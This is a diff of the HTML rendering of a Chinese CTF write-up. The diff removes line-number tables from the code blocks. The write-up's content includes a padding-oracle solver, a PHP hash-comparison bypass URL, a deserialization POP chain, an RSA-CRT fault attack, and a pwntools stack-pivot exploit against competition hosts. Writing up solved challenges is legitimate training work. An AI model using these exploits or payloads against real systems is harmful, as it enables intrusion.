 <p>第五关 几次尝试后，发现它的加密实际上就是对每2byte进行置换，列一个置换表出来，即可找到secret</p>
 <p>第六关 padding oracle attack</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">  1
-</span><span class="lnt">  2
-</span><span class="lnt">  3
-</span><span class="lnt">  4
-</span><span class="lnt">  5
-</span><span class="lnt">  6
-</span><span class="lnt">  7
-</span><span class="lnt">  8
-</span><span class="lnt">  9
-</span><span class="lnt"> 10
-</span><span class="lnt"> 11
-</span><span class="lnt"> 12
-</span><span class="lnt"> 13
-</span><span class="lnt"> 14
-</span><span class="lnt"> 15
-</span><span class="lnt"> 16
-</span><span class="lnt"> 17
-</span><span class="lnt"> 18
-</span><span class="lnt"> 19
-</span><span class="lnt"> 20
-</span><span class="lnt"> 21
-</span><span class="lnt"> 22
-</span><span class="lnt"> 23
-</span><span class="lnt"> 24
-</span><span class="lnt"> 25
-</span><span class="lnt"> 26
-</span><span class="lnt"> 27
-</span><span class="lnt"> 28
-</span><span class="lnt"> 29
-</span><span class="lnt"> 30
-</span><span class="lnt"> 31
-</span><span class="lnt"> 32
-</span><span class="lnt"> 33
-</span><span class="lnt"> 34
-</span><span class="lnt"> 35
-</span><span class="lnt"> 36
-</span><span class="lnt"> 37
-</span><span class="lnt"> 38
-</span><span class="lnt"> 39
-</span><span class="lnt"> 40
-</span><span class="lnt"> 41
-</span><span class="lnt"> 42
-</span><span class="lnt"> 43
-</span><span class="lnt"> 44
-</span><span class="lnt"> 45
-</span><span class="lnt"> 46
-</span><span class="lnt"> 47
-</span><span class="lnt"> 48
-</span><span class="lnt"> 49
-</span><span class="lnt"> 50
-</span><span class="lnt"> 51
-</span><span class="lnt"> 52
-</span><span class="lnt"> 53
-</span><span class="lnt"> 54
-</span><span class="lnt"> 55
-</span><span class="lnt"> 56
-</span><span class="lnt"> 57
-</span><span class="lnt"> 58
-</span><span class="lnt"> 59
-</span><span class="lnt"> 60
-</span><span class="lnt"> 61
-</span><span class="lnt"> 62
-</span><span class="lnt"> 63
-</span><span class="lnt"> 64
-</span><span class="lnt"> 65
-</span><span class="lnt"> 66
-</span><span class="lnt"> 67
-</span><span class="lnt"> 68
-</span><span class="lnt"> 69
-</span><span class="lnt"> 70
-</span><span class="lnt"> 71
-</span><span class="lnt"> 72
-</span><span class="lnt"> 73
-</span><span class="lnt"> 74
-</span><span class="lnt"> 75
-</span><span class="lnt"> 76
-</span><span class="lnt"> 77
-</span><span class="lnt"> 78
-</span><span class="lnt"> 79
-</span><span class="lnt"> 80
-</span><span class="lnt"> 81
-</span><span class="lnt"> 82
-</span><span class="lnt"> 83
-</span><span class="lnt"> 84
-</span><span class="lnt"> 85
-</span><span class="lnt"> 86
-</span><span class="lnt"> 87
-</span><span class="lnt"> 88
-</span><span class="lnt"> 89
-</span><span class="lnt"> 90
-</span><span class="lnt"> 91
-</span><span class="lnt"> 92
-</span><span class="lnt"> 93
-</span><span class="lnt"> 94
-</span><span class="lnt"> 95
-</span><span class="lnt"> 96
-</span><span class="lnt"> 97
-</span><span class="lnt"> 98
-</span><span class="lnt"> 99
-</span><span class="lnt">100
-</span><span class="lnt">101
-</span><span class="lnt">102
-</span><span class="lnt">103
-</span><span class="lnt">104
-</span><span class="lnt">105
-</span><span class="lnt">106
-</span><span class="lnt">107
-</span><span class="lnt">108
-</span><span class="lnt">109
-</span><span class="lnt">110
-</span><span class="lnt">111
-</span><span class="lnt">112
-</span><span class="lnt">113
-</span><span class="lnt">114
-</span><span class="lnt">115
-</span><span class="lnt">116
-</span><span class="lnt">117
-</span><span class="lnt">118
-</span><span class="lnt">119
-</span><span class="lnt">120
-</span><span class="lnt">121
-</span><span class="lnt">122
-</span><span class="lnt">123
-</span><span class="lnt">124
-</span><span class="lnt">125
-</span><span class="lnt">126
-</span><span class="lnt">127
-</span><span class="lnt">128
-</span><span class="lnt">129
-</span><span class="lnt">130
-</span><span class="lnt">131
-</span><span class="lnt">132
-</span><span class="lnt">133
-</span><span class="lnt">134
-</span><span class="lnt">135
-</span><span class="lnt">136
-</span><span class="lnt">137
-</span><span class="lnt">138
-</span><span class="lnt">139
-</span><span class="lnt">140
-</span><span class="lnt">141
-</span><span class="lnt">142
-</span><span class="lnt">143
-</span><span class="lnt">144
-</span><span class="lnt">145
-</span><span class="lnt">146
-</span><span class="lnt">147
-</span><span class="lnt">148
-</span><span class="lnt">149
-</span><span class="lnt">150
-</span><span class="lnt">151
-</span><span class="lnt">152
-</span><span class="lnt">153
-</span><span class="lnt">154
-</span><span class="lnt">155
-</span><span class="lnt">156
-</span><span class="lnt">157
-</span><span class="lnt">158
-</span><span class="lnt">159
-</span><span class="lnt">160
-</span><span class="lnt">161
-</span><span class="lnt">162
-</span><span class="lnt">163
-</span><span class="lnt">164
-</span><span class="lnt">165
-</span><span class="lnt">166
-</span><span class="lnt">167
-</span><span class="lnt">168
-</span><span class="lnt">169
-</span><span class="lnt">170
-</span><span class="lnt">171
-</span><span class="lnt">172
-</span><span class="lnt">173
-</span><span class="lnt">174
-</span><span class="lnt">175
-</span><span class="lnt">176
-</span><span class="lnt">177
-</span><span class="lnt">178
-</span><span class="lnt">179
-</span><span class="lnt">180
-</span><span class="lnt">181
-</span><span class="lnt">182
-</span><span class="lnt">183
-</span><span class="lnt">184
-</span><span class="lnt">185
-</span><span class="lnt">186
-</span><span class="lnt">187
-</span><span class="lnt">188
-</span><span class="lnt">189
-</span><span class="lnt">190
-</span><span class="lnt">191
-</span><span class="lnt">192
-</span><span class="lnt">193
-</span><span class="lnt">194
-</span><span class="lnt">195
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
@@ -2645,31 +1491,12 @@ f_byte: fault input byte</p>
 </span></span><span class="line"><span class="cl"><span class="n">solve_6</span><span class="p">()</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="https://hackmd.summershrimp.com/uploads/upload_89f5b8eb5b121d8ba732901351531e73.png" alt=""></p>
+</span></span></code></pre></div><p><img src="https://hackmd.summershrimp.com/uploads/upload_89f5b8eb5b121d8ba732901351531e73.png" alt=""></p>
 <h2 id="blockchain">Blockchain</h2>
 <h3 id="ipfs">IPFS</h3>
 <p>可以通过命令<code>ipfs cat &lt;hash&gt; &gt; i.data</code>把pic1.jpg的6块block给下载下来，很明显第4条hash对应jpg文件的开头，第5条hash对应jpg文件的结尾</p>
 <p>剩余的4块可以穷举拼接一下，看能不能恢复成正常的图形：</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">permutation</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">permutation</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">pics</span> <span class="o">=</span> <span class="p">[]</span>
 </span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">6</span><span class="p">):</span>
@@ -2682,27 +1509,15 @@ f_byte: fault input byte</p>
 </span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">+=</span> <span class="n">pics</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="c1"># 5th hash</span>
 </span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">perm</span><span class="p">)</span><span class="si">}</span><span class="s2">.jpg&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p>发现0213.jpg可以正常显示：</p>
+</span></span></code></pre></div><p>发现0213.jpg可以正常显示：</p>
 <p><img src="https://i.loli.net/2020/08/23/WhGOoXKJQVyH4c2.png" alt="Screen Shot 2020-08-23 at 2.32.56 AM"></p>
 <p>pic2.jpg，给出了文件的sha256sum，根据QmHash的格式，可以得到pic2.jpg的QmHash：</p>
 <p><img src="https://i.loli.net/2020/08/23/vsh6M3fpr9OAx2Q.png" alt="image-20200823023341028"></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span><span class="lnt">2
-</span><span class="lnt">3
-</span><span class="lnt">4
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base58</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base58</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">base58</span><span class="o">.</span><span class="n">b58encode</span><span class="p">(</span><span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s2">&#34;1220&#34;</span><span class="o">+</span><span class="s2">&#34;659c2a2c3ed5e50f848135eea4d3ead3fa2607e2102ae73fafe8f82378ce1d1e&#34;</span><span class="p">)))</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># b&#39;QmVBHzwuchpfHLxEqNrBb3492E73DHE99yFCxx1UYcJ6R3&#39;</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><code>ipfs cat QmVBHzwuchpfHLxEqNrBb3492E73DHE99yFCxx1UYcJ6R3 &gt; pic2.jpg</code>可以得到第二张图片：</p>
+</span></span></code></pre></div><p><code>ipfs cat QmVBHzwuchpfHLxEqNrBb3492E73DHE99yFCxx1UYcJ6R3 &gt; pic2.jpg</code>可以得到第二张图片：</p>
 <p><img src="https://i.loli.net/2020/08/23/yltfSPeMgpYLJUu.png" alt="Screen Shot 2020-08-23 at 2.36.21 AM"></p>
 <p>组合起来就是：<code>flag=flag{md5( hash1 + hash2 )}</code></p>
 <p>hash2已经有了：QmVBHzwuchpfHLxEqNrBb3492E73DHE99yFCxx1UYcJ6R3</p>
@@ -2722,139 +1537,11 @@ f_byte: fault input byte</p>
 <h3 id="funhash">Funhash</h3>
 <p>web题 http://39.101.177.96/
 payload</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://39.101.177.96/?hash1=0e251288019&amp;hash2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;hash3=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2&amp;hash4=ffifdyop
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="web辅助">web辅助</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://39.101.177.96/?hash1=0e251288019&amp;hash2=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;hash3=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2&amp;hash4=ffifdyop
+</span></span></code></pre></div><h3 id="web辅助">web辅助</h3>
 <p><a href="http://eci-2ze9cia09xafqb8rd109.cloudeci1.ichunqiu.com/">http://eci-2ze9cia09xafqb8rd109.cloudeci1.ichunqiu.com/</a><br>
 签到题，看脚本吧，没什么难度</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">  1
-</span><span class="lnt">  2
-</span><span class="lnt">  3
-</span><span class="lnt">  4
-</span><span class="lnt">  5
-</span><span class="lnt">  6
-</span><span class="lnt">  7
-</span><span class="lnt">  8
-</span><span class="lnt">  9
-</span><span class="lnt"> 10
-</span><span class="lnt"> 11
-</span><span class="lnt"> 12
-</span><span class="lnt"> 13
-</span><span class="lnt"> 14
-</span><span class="lnt"> 15
-</span><span class="lnt"> 16
-</span><span class="lnt"> 17
-</span><span class="lnt"> 18
-</span><span class="lnt"> 19
-</span><span class="lnt"> 20
-</span><span class="lnt"> 21
-</span><span class="lnt"> 22
-</span><span class="lnt"> 23
-</span><span class="lnt"> 24
-</span><span class="lnt"> 25
-</span><span class="lnt"> 26
-</span><span class="lnt"> 27
-</span><span class="lnt"> 28
-</span><span class="lnt"> 29
-</span><span class="lnt"> 30
-</span><span class="lnt"> 31
-</span><span class="lnt"> 32
-</span><span class="lnt"> 33
-</span><span class="lnt"> 34
-</span><span class="lnt"> 35
-</span><span class="lnt"> 36
-</span><span class="lnt"> 37
-</span><span class="lnt"> 38
-</span><span class="lnt"> 39
-</span><span class="lnt"> 40
-</span><span class="lnt"> 41
-</span><span class="lnt"> 42
-</span><span class="lnt"> 43
-</span><span class="lnt"> 44
-</span><span class="lnt"> 45
-</span><span class="lnt"> 46
-</span><span class="lnt"> 47
-</span><span class="lnt"> 48
-</span><span class="lnt"> 49
-</span><span class="lnt"> 50
-</span><span class="lnt"> 51
-</span><span class="lnt"> 52
-</span><span class="lnt"> 53
-</span><span class="lnt"> 54
-</span><span class="lnt"> 55
-</span><span class="lnt"> 56
-</span><span class="lnt"> 57
-</span><span class="lnt"> 58
-</span><span class="lnt"> 59
-</span><span class="lnt"> 60
-</span><span class="lnt"> 61
-</span><span class="lnt"> 62
-</span><span class="lnt"> 63
-</span><span class="lnt"> 64
-</span><span class="lnt"> 65
-</span><span class="lnt"> 66
-</span><span class="lnt"> 67
-</span><span class="lnt"> 68
-</span><span class="lnt"> 69
-</span><span class="lnt"> 70
-</span><span class="lnt"> 71
-</span><span class="lnt"> 72
-</span><span class="lnt"> 73
-</span><span class="lnt"> 74
-</span><span class="lnt"> 75
-</span><span class="lnt"> 76
-</span><span class="lnt"> 77
-</span><span class="lnt"> 78
-</span><span class="lnt"> 79
-</span><span class="lnt"> 80
-</span><span class="lnt"> 81
-</span><span class="lnt"> 82
-</span><span class="lnt"> 83
-</span><span class="lnt"> 84
-</span><span class="lnt"> 85
-</span><span class="lnt"> 86
-</span><span class="lnt"> 87
-</span><span class="lnt"> 88
-</span><span class="lnt"> 89
-</span><span class="lnt"> 90
-</span><span class="lnt"> 91
-</span><span class="lnt"> 92
-</span><span class="lnt"> 93
-</span><span class="lnt"> 94
-</span><span class="lnt"> 95
-</span><span class="lnt"> 96
-</span><span class="lnt"> 97
-</span><span class="lnt"> 98
-</span><span class="lnt"> 99
-</span><span class="lnt">100
-</span><span class="lnt">101
-</span><span class="lnt">102
-</span><span class="lnt">103
-</span><span class="lnt">104
-</span><span class="lnt">105
-</span><span class="lnt">106
-</span><span class="lnt">107
-</span><span class="lnt">108
-</span><span class="lnt">109
-</span><span class="lnt">110
-</span><span class="lnt">111
-</span><span class="lnt">112
-</span><span class="lnt">113
-</span><span class="lnt">114
-</span><span class="lnt">115
-</span><span class="lnt">116
-</span><span class="lnt">117
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
 </span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">topsolo</span><span class="p">{</span>
 </span></span><span class="line"><span class="cl">    <span class="n">protected</span> <span class="o">$</span><span class="n">name</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
@@ -2971,34 +1658,10 @@ payload</p>
 </span></span><span class="line"><span class="cl"><span class="n">var_dump</span><span class="p">(</span><span class="n">unserialize</span><span class="p">(</span><span class="o">$</span><span class="n">dump</span><span class="p">));</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">var_dump</span><span class="p">(</span><span class="o">$</span><span class="n">dump</span><span class="p">);</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="侧防">侧防</h3>
+</span></span></code></pre></div><h3 id="侧防">侧防</h3>
 <p>rev
 xor key后有个换位操作，做对应逆运算即可</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">  a = &#39;QWBlogs&#39;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">  a = &#39;QWBlogs&#39;
 </span></span><span class="line"><span class="cl">b = [0x4C, 0x78, 0x7C, 0x64, 0x54, 0x55, 0x77, 0x65, 0x5C, 0x49,
 </span></span><span class="line"><span class="cl">  0x76, 0x4E, 0x68, 0x43, 0x42, 0x4F, 0x4C, 0x71, 0x44, 0x4E,
 </span></span><span class="line"><span class="cl">  0x66, 0x57, 0x7D, 0x49, 0x6D, 0x46, 0x5A, 0x43, 0x74, 0x69,
@@ -3016,36 +1679,12 @@ xor key后有个换位操作，做对应逆运算即可</p>
 </span></span><span class="line"><span class="cl">print c
 </span></span><span class="line"><span class="cl">print len(b)
 </span></span><span class="line"><span class="cl">print len(c)
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="baby_crt">baby_crt</h3>
+</span></span></code></pre></div><h3 id="baby_crt">baby_crt</h3>
 <p>crypto</p>
 <p>RSA CRT fault</p>
 <p><a href="http://dl.ifip.org/db/conf/wistp/wistp2007/KimQ07.pdf">http://dl.ifip.org/db/conf/wistp/wistp2007/KimQ07.pdf</a></p>
 <p><img src="https://hackmd.summershrimp.com/uploads/upload_7487dc2dc6748d87889114d2ddd279d6.png" alt=""></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">sha1</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">sha1</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Util.number</span> <span class="kn">import</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">n</span> <span class="o">=</span> <span class="mi">26318358382258215770827770763384603359524444566146134039272065206657135513496897321983920652242182112479484135343436206815722605756557098241887233837248519031879444740922789351356138322947108346833956405647578838873425658405513192437479359531790697924285889505666769580176431360506227506064132034621123828090480606055877425480739950809109048177976884825589023444901953529913585288143291544181183810227553891973915960951526154469344587083295640034876874318610991153058462811369615555470571469517472865469502025030548451296909857667669963720366290084062470583318590585472209798523021029182199921435625983186101089395997</span>
@@ -3063,54 +1702,9 @@ xor key后有个换位操作，做对应逆运算即可</p>
 </span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;flag{&#34;</span> <span class="o">+</span> <span class="n">sha1</span><span class="p">(</span><span class="n">long_to_bytes</span><span class="p">(</span><span class="nb">min</span><span class="p">(</span><span class="n">p</span><span class="p">,</span><span class="n">q</span><span class="p">)))</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span> <span class="o">+</span> <span class="s2">&#34;}&#34;</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># 27152 175947855464630318882274211369050447335314682338022384131546160543733195355501291230119719123032944939427500196558321955068490980548179604648557892933129317527213012520680627573834567002223872890806611275061140244033706361520509332755932759567357620312030849014630507761409535339555754829420991613721802012281</span>
 </span></span><span class="line"><span class="cl"><span class="c1"># flag{601cb6f6d990ed5b89cf0de60508a95c07543793}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="babymessage">babymessage</h3>
+</span></span></code></pre></div><h3 id="babymessage">babymessage</h3>
 <p>可以覆盖ebp，因为没开pie，所以直接栈迁移到bss上导致了第二次调用时候会栈溢出。</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from pwn import *
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">from pwn import *
 </span></span><span class="line"><span class="cl">#r=process(&#39;./babymessage&#39;)
 </span></span><span class="line"><span class="cl">r=remote(&#39;123.56.170.202&#39;,21342)
 </span></span><span class="line"><span class="cl">main_addr=0x00000000040091A
@@ -3149,9 +1743,7 @@ xor key后有个换位操作，做对应逆运算即可</p>
 </span></span><span class="line"><span class="cl">r.send(&#39;b&#39;*8+p64(0x6010d0+4)+p64(one))
 </span></span><span class="line"><span class="cl">#r.send(&#39;b&#39;*8+p64(0x6010d0+4)+p64(pd)+p64(0x00000000006010D0)+p64(sys))
 </span></span><span class="line"><span class="cl">r.interactive()
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h3 id="bank">bank</h3>
+</span></span></code></pre></div><h3 id="bank">bank</h3>
 <p>no negative check for amount</p>
 <p>transact
 Alice -1000
@@ -3159,70 +1751,7 @@ get flag</p>
 <p><img src="https://hackmd.summershrimp.com/uploads/upload_28920235447ac58455a8fc5ce744baac.png" alt=""></p>
 <h3 id="红方辅助">红方辅助</h3>
 <p>分析一下流量的格式，解解密就行</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
-</span><span class="lnt">56
-</span><span class="lnt">57
-</span><span class="lnt">58
-</span><span class="lnt">59
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">struct</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">multiprocessing</span>
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
 </span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">md5</span><span class="p">,</span> <span class="n">sha256</span>
@@ -3281,60 +1810,12 @@ get flag</p>
 </span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">plain</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="n">index</span> <span class="o">+=</span> <span class="mi">9</span> <span class="o">+</span> <span class="mi">10</span> <span class="o">+</span> <span class="n">data_length</span> <span class="o">+</span> <span class="mi">4</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><img src="https://hackmd.summershrimp.com/uploads/upload_dd2a1b0987a7931fcf7479b8dbd231a6.png" alt=""></p>
